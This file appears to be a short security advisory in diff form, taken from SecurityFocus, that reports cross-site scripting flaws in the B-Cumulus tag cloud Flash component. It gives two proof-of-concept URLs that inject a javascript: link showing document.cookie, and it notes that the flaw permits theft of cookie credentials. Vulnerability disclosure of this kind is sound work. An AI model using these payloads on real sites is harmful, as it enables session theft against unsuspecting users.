@@ -1,0 +1,9 @@
+source: http://www.securityfocus.com/bid/45911/info
+
+B-Cumulus is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker to steal cookie-based authentication credentials and to launch other attacks. 
+
+http://www.example.com/path/tagcloud.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E
+
+http://www.example.com/path/tagcloud-ru.swf?mode=tags&tagcloud=%3Ctags%3E%3Ca+href='javascript:alert(document.cookie)'+style='font-size:+40pt'%3EClick%20me%3C/a%3E%3C/tags%3E 
